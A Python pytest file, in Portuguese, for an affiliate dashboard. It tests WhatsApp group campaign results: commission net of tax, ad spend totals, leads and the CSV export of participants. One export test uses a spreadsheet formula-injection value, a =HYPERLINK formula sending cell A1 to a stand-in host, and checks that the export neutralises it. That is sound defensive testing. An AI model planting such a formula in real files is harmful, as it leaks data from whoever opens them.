"""
Resultados por grupo (F7): a corrente virando número.

O invariante mais importante: **comissão líquida usa a fórmula do KpiService**
(bruta × (1 − imposto)), nunca as colunas cost/profit, que estão mortas. Se
divergir do Dashboard, a afiliada perde a confiança nos dois números.
"""
import uuid
from datetime import date, datetime, timedelta, timezone

import pytest
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

PG_URL = "postgresql://dashads_user:dashads_password@localhost:5434/dashads_db"
try:
    _p = create_engine(PG_URL, pool_pre_ping=True)
    with _p.connect() as _c:
        _c.execute(text("SELECT 1"))
    PG_OK = True
except Exception:
    PG_OK = False

pytestmark = pytest.mark.skipif(not PG_OK, reason="Postgres local (5434) indisponível")

if PG_OK:
    from app.db.base import Base
    import app.models  # noqa: F401
    ENGINE = create_engine(PG_URL)
    Base.metadata.create_all(ENGINE)
    with ENGINE.begin() as _conn:
        # 074 (toggle "Ativo" da usuária): create_all NÃO adiciona coluna em
        # tabela existente — o mesmo gotcha de produção, no banco de teste.
        _conn.execute(text(
            "ALTER TABLE whatsapp_grupos ADD COLUMN IF NOT EXISTS "
            "ativado BOOLEAN NOT NULL DEFAULT FALSE"
        ))
    with ENGINE.begin() as _conn:
        _conn.execute(text("ALTER TABLE campaign_daily_insights ADD COLUMN IF NOT EXISTS leads INTEGER"))
    Sessao = sessionmaker(bind=ENGINE)

from fastapi import HTTPException  # noqa: E402

from app.models.campanha_anuncio import CampanhaAnuncio  # noqa: E402
from app.models.campanha_link import GrupoEvento  # noqa: E402
from app.models.campanha_grupos import Campanha, CampanhaGrupo  # noqa: E402
from app.models.campaign import Campaign, CampaignDailyInsight  # noqa: E402
from app.models.dataset import Dataset  # noqa: E402
from app.models.dataset_row import DatasetRow  # noqa: E402
from app.models.user import User  # noqa: E402
from app.models.user_settings import UserSettings  # noqa: E402
from app.models.whatsapp_grupos import WhatsappGrupo  # noqa: E402
from app.repositories.campanha_anuncio_repository import CampanhaAnuncioRepository  # noqa: E402
from app.services.campanha_resultado_service import CampanhaResultadoService  # noqa: E402
from app.services.grupo_evento_service import GrupoEventoService  # noqa: E402

HOJE = date.today()
ONTEM = HOJE - timedelta(days=1)


@pytest.fixture
def db():
    s = Sessao()
    yield s
    s.rollback()
    s.close()


def _cenario(db, imposto_comissao=0.0, imposto_anuncio=0.0):
    suf = uuid.uuid4().hex[:8]
    user = User(email=f"r-{suf}@x.com", hashed_password="x")
    db.add(user); db.flush()
    if imposto_comissao or imposto_anuncio:
        db.add(UserSettings(user_id=user.id, ad_tax_rate=imposto_anuncio,
                            commission_tax_rate=imposto_comissao))
    campanha = Campanha(user_id=user.id, nome=f"c-{suf}")
    db.add(campanha); db.flush()
    grupos = []
    for i in range(2):
        g = WhatsappGrupo(user_id=user.id, jid=f"12036{suf}{i}@g.us", nome=f"G{i}",
                          ativo=True, ativado=True, permite_envio=True, sou_admin=True,
                          participantes=100 * (i + 1), capacidade=1024,
                          # Entropia inteira: `sub_id` é UNIQUE e este banco de
                          # teste acumula entre execuções — 4 hex colidem.
                          sub_id=f"wg{suf}{i}",
                          link_convite=f"https://chat.whatsapp.com/{suf}{i}")
        db.add(g); db.flush()
        db.add(CampanhaGrupo(campanha_id=campanha.id, grupo_id=g.id, posicao=i))
        grupos.append(g)
    # dataset_rows_v2 tem FK para datasets — o cenário precisa de um real.
    dataset = Dataset(user_id=user.id, filename=f"t-{suf}.csv", status="completed")
    db.add(dataset); db.flush()
    db.commit()
    return user, campanha, grupos, dataset.id


def _venda(db, user_id, sub_id, comissao, order_id, status="concluído", dia=None,
           dataset_id=1):
    db.add(DatasetRow(dataset_id=dataset_id, user_id=user_id, date=dia or HOJE, product="p",
                      status=status, revenue=comissao * 10, commission=comissao,
                      sub_id1=sub_id, order_id=order_id))


def test_comissao_liquida_usa_a_formula_do_kpi_service(db):
    user, campanha, grupos, ds = _cenario(db, imposto_comissao=6.0)   # 6%
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    _venda(db, user.id, grupos[0].sub_id, 50.0, "P2", dataset_id=ds)
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    linha = next(l for l in r["linhas"] if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(141.0)   # 150 × 0,94
    assert linha["pedidos"] == 2


def test_pedido_cancelado_nao_conta_mas_a_comissao_soma(db):
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 10.0, "OK", dataset_id=ds)
    _venda(db, user.id, grupos[0].sub_id, 5.0, "CANC", status="cancelado", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["pedidos"] == 1
    assert linha["comissao_liquida"] == pytest.approx(15.0)


def test_a_linha_do_grupo_nao_tem_gasto_lucro_nem_lucro_por_pessoa(db):
    """
    Os três saíram da linha em 04/09 e a razão é aritmética, não estética.

    Eles dependiam de ratear o gasto da campanha entre os grupos, e não existe
    informação para essa divisão. Pior: quando ninguém entrava no período, o
    rateio dividia IGUALMENTE — foi assim que R$1.223,05 virou R$611,52 em dois
    grupos de tamanhos completamente diferentes, e "lucro por pessoa" de
    −R$0,65 / −R$0,92, que é justamente a métrica de destaque do módulo.

    A comissão por grupo CONTINUA na linha: essa é real, vem do Sub ID do grupo.
    """
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 200.0, "P1", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(200.0)
    for campo in ("gasto_atribuido", "lucro", "lucro_por_pessoa"):
        assert campo not in linha, f"{campo} voltou para a linha do grupo"


def test_gasto_do_anuncio_entra_inteiro_no_total_e_nunca_na_linha(db):
    user, campanha, grupos, ds = _cenario(db, imposto_anuncio=10.0)   # markup 10%
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="Anúncio de grupo", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=100.0, clicks=10, impressions=100, leads=8))
    db.commit()

    svc = GrupoEventoService(db)
    svc.registrar(user.id, grupos[0].jid, "join",
                  [f"55119999{i:04d}@c.us" for i in range(3)])
    svc.registrar(user.id, grupos[1].jid, "join", ["5511988887777@c.us"])

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    # O gasto entra INTEIRO, uma vez, no nível da campanha — 100 × 1,10 = 110.
    # Não é a soma de parcelas por grupo: aquela divisão era inventada.
    assert r["totais"]["gasto_atribuido"] == pytest.approx(110.0)
    assert r["totais"]["lucro"] == pytest.approx(-110.0)   # sem comissão
    assert all("gasto_atribuido" not in l for l in r["linhas"])


def test_metricas_do_anuncio_distinguem_sem_pixel_de_zero_lead(db):
    user, campanha, grupos, ds = _cenario(db)
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    # dia SEM leads reportados (sem pixel) → NULL, não 0
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=50.0, clicks=5, impressions=50, leads=None))
    db.commit()

    m = CampanhaAnuncioRepository(db).metricas(user.id, campanha.id, ONTEM, HOJE)
    assert m["gasto"] == pytest.approx(50.0)
    assert m["leads"] is None        # "configure o pixel", nunca "0 leads"


def test_vinculo_substitui_o_conjunto_e_alimenta_o_selo(db):
    user, campanha, grupos, ds = _cenario(db)
    anuncios = []
    for i in range(3):
        c = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                     name=f"A{i}", status="ACTIVE")
        db.add(c); db.flush()
        anuncios.append(c)
    repo = CampanhaAnuncioRepository(db)

    repo.definir(campanha.id, [anuncios[0].id, anuncios[1].id])
    db.commit()
    assert set(repo.campaign_ids(campanha.id)) == {anuncios[0].id, anuncios[1].id}

    repo.definir(campanha.id, [anuncios[2].id])
    db.commit()
    assert repo.campaign_ids(campanha.id) == [anuncios[2].id]

    selo = repo.campanha_por_campaign(user.id)
    assert selo[anuncios[2].id]["nome"] == campanha.nome
    assert anuncios[0].id not in selo


def test_campanha_sem_grupos_nao_quebra(db):
    suf = uuid.uuid4().hex[:8]
    user = User(email=f"v-{suf}@x.com", hashed_password="x")
    db.add(user); db.flush()
    campanha = Campanha(user_id=user.id, nome="vazia")
    db.add(campanha); db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r["linhas"] == [] and r["totais"]["lucro"] == 0.0


def test_entradas_antigas_ficam_fora_do_periodo(db):
    """
    Entradas/saídas seguem o filtro de período como todo o resto da tela.

    Sem isso a tela soma entradas históricas ao lado de comissão de 7 dias.
    """
    user, campanha, grupos, ds = _cenario(db, imposto_anuncio=0.0)
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=100.0, clicks=10, impressions=100, leads=None))
    db.commit()

    svc = GrupoEventoService(db)
    svc.registrar(user.id, grupos[0].jid, "join", ["5511900000001@c.us"])
    svc.registrar(user.id, grupos[1].jid, "join", ["5511900000002@c.us"])
    db.commit()

    # Envelhece a entrada do grupo 1 para 40 dias atrás.
    db.execute(text("""
        UPDATE grupo_eventos SET criado_em = now() - interval '40 days'
         WHERE grupo_id = :gid
    """), {"gid": grupos[1].id})
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    por_id = {l["grupo_id"]: l for l in r["linhas"]}
    assert por_id[grupos[1].id]["entradas"] == 0, "entrada de 40 dias atrás entrou no período"
    assert por_id[grupos[0].id]["entradas"] == 1
    # O gasto do período continua inteiro no total, independente de onde as
    # pessoas entraram — não há mais rateio para as entradas distorcerem.
    assert r["totais"]["gasto_atribuido"] == pytest.approx(100.0)


def test_resumo_consolidado_soma_campanhas_e_preserva_leads_nulo(db):
    """
    O bloco do Dashboard soma as campanhas ativas. `leads` continua None quando
    NENHUMA campanha reporta lead — somar como 0 diria "ninguém virou lead",
    que é uma afirmação diferente de "não sabemos".
    """
    from app.api.v1.routes.campanhas_grupos import resumo_consolidado

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 80.0, "P1", dataset_id=ds)

    outra = Campanha(user_id=user.id, nome="Segunda")
    db.add(outra); db.flush()
    g = WhatsappGrupo(user_id=user.id, jid=f"12036{uuid.uuid4().hex[:8]}@g.us",
                      nome="G-outra", ativo=True, ativado=True, permite_envio=True,
                      sou_admin=True,
                      participantes=50, capacidade=1024,
                      sub_id=f"wg{uuid.uuid4().hex[:6]}",
                      link_convite="https://chat.whatsapp.com/z")
    db.add(g); db.flush()
    db.add(CampanhaGrupo(campanha_id=outra.id, grupo_id=g.id, posicao=0))
    _venda(db, user.id, g.sub_id, 20.0, "P2", dataset_id=ds)
    db.commit()

    r = resumo_consolidado(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                           current_user=user, db=db)
    assert r["campanhas_ativas"] == 2
    assert r["totais"]["comissao_liquida"] == pytest.approx(100.0)
    assert r["totais"]["participantes"] == 350          # 100 + 200 + 50
    assert r["leads"] is None                            # nenhum anúncio vinculado
    assert r["custo_por_entrada"] is None                # sem entradas
    assert [c["nome"] for c in r["por_campanha"]][0] == campanha.nome   # maior lucro 1º


def test_status_fora_do_kpi_nao_entra_na_comissao_do_grupo(db):
    """
    O recorte de status é o MESMO do KpiService — senão esta tela e o Dashboard
    mostram comissão diferente para a mesma venda, e é esta que decide quanto
    gastar em anúncio.

    UNPAID fica de fora (comissão não confirmada não é comissão); "cancelled"
    com dois L é a grafia que a Shopee realmente manda — some na comissão, mas
    não conta como pedido.
    """
    user, campanha, grupos, ds = _cenario(db)
    sub = grupos[0].sub_id
    _venda(db, user.id, sub, 100.0, "OK", dataset_id=ds)
    _venda(db, user.id, sub, 500.0, "SEM_PAGAMENTO", status="UNPAID", dataset_id=ds)
    _venda(db, user.id, sub, 70.0, "CANC", status="cancelled", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(170.0)   # 100 + 70, sem o UNPAID
    assert linha["pedidos"] == 1                                # cancelled não conta


def test_sub_id_com_traco_no_fim_ainda_casa_com_o_grupo(db):
    """`normalizar_sub_id` faz rtrim('-'); o filtro em SQL precisa fazer o
    mesmo, ou a venda desaparece da tela sem erro nenhum."""
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, f"{grupos[0].sub_id.upper()}--", 40.0, "P1", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(40.0)


def test_payloads_batem_com_os_schemas_de_resposta(db):
    """
    O `response_model` só valida na fronteira HTTP; os testes chamam a função
    direto e passariam por cima de um campo faltando. Validar aqui garante que
    a mudança de shape quebra o teste, não a tela.
    """
    from app.api.v1.routes.campanhas_grupos import resultados, resumo_consolidado
    from app.schemas.campanhas_grupos import ResultadosOut, ResumoConsolidadoOut

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 30.0, "P1", dataset_id=ds)
    db.commit()

    ResultadosOut.model_validate(resultados(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
        campanha=campanha, current_user=user, db=db))
    ResumoConsolidadoOut.model_validate(resumo_consolidado(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(), current_user=user, db=db))

    # As duas de vínculo também: um 500 de response_model só apareceu quando a
    # rota foi chamada por HTTP de verdade (chave int contra Dict[str, ...]).
    from app.api.v1.routes.campanhas_grupos import listar_anuncios, vinculos_de_anuncio
    from app.schemas.campanhas_grupos import AnunciosDaCampanhaOut, VinculosDeAnuncioOut

    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.commit()
    VinculosDeAnuncioOut.model_validate(vinculos_de_anuncio(current_user=user, db=db))
    AnunciosDaCampanhaOut.model_validate(
        listar_anuncios(campanha=campanha, current_user=user, db=db))


def test_periodo_invalido_da_422_em_vez_de_numero_errado(db):
    """Data quebrada tem que falhar alto. Cair no default de 30 dias faz um bug
    de data no frontend virar número silenciosamente errado numa tela que
    decide quanto gastar em anúncio."""
    from fastapi import HTTPException

    from app.api.v1.routes.campanhas_grupos import resultados

    user, campanha, grupos, ds = _cenario(db)
    with pytest.raises(HTTPException) as e:
        resultados(inicio="ontem", fim=HOJE.isoformat(),
                   campanha=campanha, current_user=user, db=db)
    assert e.value.status_code == 422


def test_anuncio_ja_vinculado_a_outra_campanha_da_409(db):
    """Um anúncio do Meta pertence a UMA campanha de grupos: vinculado a duas,
    o mesmo gasto entraria inteiro nas duas e os dois lucros sairiam errados."""
    from fastapi import HTTPException

    from app.api.v1.routes.campanhas_grupos import definir_anuncios, listar_anuncios

    user, campanha, grupos, ds = _cenario(db)
    outra = Campanha(user_id=user.id, nome="Outra")
    db.add(outra); db.flush()
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="Anúncio disputado", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.commit()

    with pytest.raises(HTTPException) as e:
        definir_anuncios(payload=[anuncio.id], campanha=outra, current_user=user, db=db)
    assert e.value.status_code == 409
    # A mensagem nomeia o anúncio E a campanha que o detém: sem a segunda, a
    # afiliada não sabe para onde ir desvincular.
    assert "Anúncio disputado" in e.value.detail
    assert campanha.nome in e.value.detail

    # E a lista já avisa antes do clique, com o nome de quem o tem.
    linha = next(a for a in listar_anuncios(campanha=outra, current_user=user,
                                            db=db)["anuncios"] if a["id"] == anuncio.id)
    assert linha["vinculada"] is False
    # id junto do nome: sem o id a tela só linka para a lista e a afiliada tem
    # que caçar qual campanha desvincular.
    assert linha["vinculada_em_outra"] == {"id": campanha.id, "nome": campanha.nome}


def _csv_da_exportacao(resposta) -> list[str]:
    """StreamingResponse expõe um async generator — consome de propósito pelo
    mesmo caminho que o Starlette usaria."""
    import asyncio

    async def _juntar():
        partes = []
        async for p in resposta.body_iterator:
            partes.append(p.encode() if isinstance(p, str) else p)
        return b"".join(partes).decode()

    return asyncio.run(_juntar()).strip().splitlines()


def _participante(db, grupo, identificador, telefone=None, visto_em=None):
    """
    Semeia a lista de membros que o sync manteria.

    A exportação passou a ler `grupo_participantes` (080) em vez de eventos de
    entrada: um grupo com 946 pessoas acumuladas em meses exportava 8 linhas
    pelo modelo antigo, porque só quem entrou nos últimos 30 dias tinha evento.
    """
    from app.models.whatsapp_grupos import GrupoParticipante
    from app.services.grupo_evento_service import identificador as _hash

    p = GrupoParticipante(
        grupo_id=grupo.id,
        identificador=identificador,
        telefone=telefone,
        identificador_hash=_hash(identificador),
    )
    if visto_em is not None:
        p.visto_em = visto_em
        p.confirmado_em = visto_em
    db.add(p)
    db.flush()
    return p


def test_export_neutraliza_formula_no_nome_do_grupo(db):
    """
    O nome do grupo é escrito por QUALQUER admin do grupo — inclusive alguém
    que não é a afiliada. Sem neutralizar, `=HYPERLINK(...)` vira fórmula ativa
    quando ela abre o CSV no Excel/Sheets.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    grupos[0].nome = '=HYPERLINK("http://malicioso/?d="&A1;"Clique")'
    db.add(grupos[0])
    _participante(db, grupos[0], "5511900000009@c.us", "5511900000009")
    db.commit()

    linhas = _csv_da_exportacao(exportar_leads(
        campanha=campanha, current_user=user, db=db))
    alvo = next(l for l in linhas[1:] if "HYPERLINK" in l)
    assert "'=HYPERLINK" in alvo, "fórmula saiu ativa no CSV"


def test_export_nao_quebra_com_emoji_no_nome_da_campanha(db):
    """Header HTTP é latin-1 no Starlette: emoji no nome da campanha (rotineiro)
    derrubava a request com UnicodeEncodeError — 500 sem saída para a usuária."""
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    campanha.nome = "Promoção VIP 🔥 verão"
    db.add(campanha)
    _participante(db, grupos[0], "5511900000010@c.us", "5511900000010")
    db.commit()

    r = exportar_leads(campanha=campanha, current_user=user, db=db)
    r.headers["content-disposition"].encode("latin-1")   # é o que o Starlette faz


def test_export_traz_os_participantes_atuais_e_nunca_o_hash(db):
    """
    Mudou de conceito em 04/09: o CSV é a lista de quem está no grupo AGORA.

    Antes exportava EVENTOS de entrada dos últimos 30 dias, e por isso um grupo
    com centenas de pessoas acumuladas devolvia um punhado de linhas. O hash
    continua no banco (casa entrada com saída) mas NUNCA sai no arquivo: quem
    lê a planilha não tem o que fazer com ele.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    p = _participante(db, grupos[0], "5511977776666@c.us", "5511977776666")
    db.commit()

    linhas = _csv_da_exportacao(exportar_leads(
        campanha=campanha, current_user=user, db=db))
    corpo = "\n".join(linhas)
    assert linhas[0] == "telefone,grupo,data_entrada"
    # Só os dígitos: o sufixo do JID não é dado para a afiliada.
    assert "5511977776666" in corpo
    assert "@c.us" not in corpo
    assert p.identificador_hash not in corpo


def test_export_traz_quem_entrou_ha_meses_sem_filtro_de_periodo(db):
    """
    O defeito que motivou a mudança: um grupo de 946 pessoas exportava 8 linhas.

    A lista de participantes é um RETRATO, não uma janela — quem está no grupo
    entra no arquivo mesmo tendo entrado antes de o módulo existir.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    antigo = datetime.now(timezone.utc) - timedelta(days=200)
    _participante(db, grupos[0], "5511900000200@c.us", "5511900000200",
                  visto_em=antigo)
    db.commit()

    corpo = "\n".join(_csv_da_exportacao(exportar_leads(
        campanha=campanha, current_user=user, db=db)))
    assert "5511900000200" in corpo


def test_export_usa_a_data_do_evento_quando_ela_existe(db):
    """
    `data_entrada` vem do evento de entrada; na falta dele, sai vazia para quem
    já estava no grupo desde o primeiro sync — inventar uma data seria pior.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    numero = "5511933334444@c.us"
    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join", [numero])
    _participante(db, grupos[0], numero, "5511933334444")
    # Segunda pessoa: veio no MESMO primeiro sync e nunca teve evento.
    _participante(db, grupos[0], "5511955556666@c.us", "5511955556666")
    db.commit()

    linhas = _csv_da_exportacao(exportar_leads(
        campanha=campanha, current_user=user, db=db))
    por_telefone = {l.split(",")[0]: l.split(",")[2] for l in linhas[1:]}
    assert por_telefone["5511933334444"], "quem tem evento precisa de data"
    assert por_telefone["5511955556666"] == "", "data inventada para quem não tem evento"


def test_export_deixa_telefone_vazio_quando_o_whatsapp_manda_lid(db):
    """
    LID é id opaco, não telefone (a pessoa está com privacidade ativa).

    Escrevê-lo na coluna "telefone" faria a afiliada tentar discar um número
    que não existe — pior do que a célula vazia, que é a verdade.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    _participante(db, grupos[0], "84729130@lid", telefone=None)
    db.commit()

    linhas = _csv_da_exportacao(exportar_leads(
        campanha=campanha, current_user=user, db=db))
    assert "84729130" not in "\n".join(linhas)
    # telefone(vazio), grupo, data_entrada
    assert linhas[1].split(",")[0] == ""


def test_export_filtra_pelos_grupos_selecionados(db):
    """Spec §3.6: a afiliada escolhe quais grupos exportar."""
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    _participante(db, grupos[0], "5511900000001@c.us", "5511900000001")
    _participante(db, grupos[1], "5511900000002@c.us", "5511900000002")
    db.commit()

    corpo = "\n".join(_csv_da_exportacao(exportar_leads(
        grupos=str(grupos[0].id), campanha=campanha, current_user=user, db=db)))
    assert "5511900000001" in corpo
    assert "5511900000002" not in corpo

    # Id de grupo que não é da campanha vira 422, não CSV vazio em silêncio.
    with pytest.raises(HTTPException) as erro:
        exportar_leads(grupos="999999", campanha=campanha, current_user=user, db=db)
    assert erro.value.status_code == 422


def test_export_nao_traz_quem_saiu_do_grupo(db):
    """
    A tabela de participantes responde "quem está AGORA" — o sync apaga quem
    sumiu. Quem saiu continua em `grupo_eventos` (é o que sustenta a evasão),
    mas não é lead para chamar.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    numero = "5511911112222@c.us"
    svc = GrupoEventoService(db)
    svc.registrar(user.id, grupos[0].jid, "join", [numero])
    svc.registrar(user.id, grupos[0].jid, "leave", [numero])
    _participante(db, grupos[0], "5511900000077@c.us", "5511900000077")
    db.commit()

    corpo = "\n".join(_csv_da_exportacao(exportar_leads(
        campanha=campanha, current_user=user, db=db)))
    assert "5511911112222" not in corpo, "quem saiu do grupo entrou no CSV"
    assert "5511900000077" in corpo


def test_export_de_anuncios_respeita_o_filtro_de_vinculo(db):
    """
    O arquivo tem que bater com a tela. Exportar com "Vinculadas a grupo" ativo
    e receber TODAS as campanhas é pior do que não ter export: a afiliada leva
    para a planilha um recorte diferente do que estava vendo.
    """
    user, campanha, grupos, ds = _cenario(db)
    vinculada = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                         name="Com vínculo", status="ACTIVE")
    solta = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                     name="Sem vínculo", status="ACTIVE")
    db.add_all([vinculada, solta]); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=vinculada.id))
    db.commit()

    repo = CampanhaAnuncioRepository(db)
    todas = [vinculada, solta]
    assert [c.id for c in repo.filtrar_por_vinculo(user.id, todas, "all")] == \
           [vinculada.id, solta.id]
    assert [c.id for c in repo.filtrar_por_vinculo(user.id, todas, "com_grupo")] == \
           [vinculada.id]
    assert [c.id for c in repo.filtrar_por_vinculo(user.id, todas, "sem_grupo")] == \
           [solta.id]
    # Valor desconhecido não filtra nada — nunca esconde dado por engano.
    assert len(repo.filtrar_por_vinculo(user.id, todas, "lixo")) == 2


def test_grupo_em_duas_campanhas_nao_dobra_o_bloco_do_dashboard(db):
    """
    Grupo em N campanhas é decisão de desenho da F2. Somar campanha a campanha
    contava o mesmo grupo uma vez por campanha: 1 grupo com 100 pessoas e R$100
    de comissão virava 200 pessoas e R$200 no bloco do Dashboard.
    """
    from app.api.v1.routes.campanhas_grupos import resumo_consolidado

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    outra = Campanha(user_id=user.id, nome="Segunda com o MESMO grupo")
    db.add(outra); db.flush()
    db.add(CampanhaGrupo(campanha_id=outra.id, grupo_id=grupos[0].id, posicao=0))
    db.add(CampanhaGrupo(campanha_id=outra.id, grupo_id=grupos[1].id, posicao=1))
    db.commit()

    r = resumo_consolidado(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                           current_user=user, db=db)
    assert r["campanhas_ativas"] == 2
    # Os dois grupos existem uma vez cada, não uma por campanha.
    assert r["totais"]["participantes"] == 300          # 100 + 200
    assert r["totais"]["comissao_liquida"] == pytest.approx(100.0)
    assert r["totais"]["pedidos"] == 1


def test_gasto_de_campanha_sem_grupos_entra_no_lucro_do_consolidado(db):
    """
    O investimento sempre somou todas as campanhas, mas o lucro vinha do rateio
    por grupo — e campanha sem grupo não tem rateio. O dinheiro aparecia no
    "Investimento" e sumia do "Lucro".
    """
    from app.api.v1.routes.campanhas_grupos import resumo_consolidado

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)

    vazia = Campanha(user_id=user.id, nome="Sem grupos ainda")
    db.add(vazia); db.flush()
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=vazia.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=40.0, clicks=4, impressions=40, leads=None))
    db.commit()

    r = resumo_consolidado(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                           current_user=user, db=db)
    assert r["investimento"] == pytest.approx(40.0)
    assert r["totais"]["lucro"] == pytest.approx(60.0)   # 100 de comissão − 40
    assert r["totais"]["gasto_atribuido"] == pytest.approx(40.0)


def test_lucro_por_pessoa_sem_participante_e_none_nao_zero(db):
    """
    Sem participante a métrica NÃO existe. 0,00 diria "cada pessoa rende zero",
    que é outra afirmação — o mesmo colapso null-vs-zero que o módulo evita em
    `leads` e `cpl`.
    """
    user, campanha, grupos, ds = _cenario(db)
    for g in grupos:
        g.participantes = 0
        db.add(g)
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r["totais"]["lucro_por_pessoa"] is None
    # E com participante, volta a existir — no TOTAL, que é o único nível onde
    # lucro existe desde que o rateio por grupo saiu.
    grupos[0].participantes = 50
    db.add(grupos[0]); _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    db.commit()
    r2 = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r2["totais"]["lucro_por_pessoa"] == pytest.approx(2.0)   # 100 / 50


def test_sub_id_vinculado_a_mao_soma_no_total_e_nao_vira_linha(db):
    """
    Sub ID vinculado à campanha (080) é comissão que não passa por grupo
    rastreado — entra no TOTAL. Nunca numa linha de grupo: não há como saber a
    qual grupo pertence, e inventar seria o mesmo erro do rateio que saiu daqui.
    """
    from app.models.campanha_grupos import CampanhaSubId

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    _venda(db, user.id, "promoavulsa", 50.0, "P2", dataset_id=ds)
    db.add(CampanhaSubId(campanha_id=campanha.id, sub_id="promoavulsa"))
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r["totais"]["comissao_liquida"] == pytest.approx(150.0)
    assert r["totais"]["pedidos"] == 2
    # A linha do grupo continua só com o que é dela.
    linha = next(l for l in r["linhas"] if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(100.0)
    assert all(l["grupo"] is not None for l in r["linhas"])
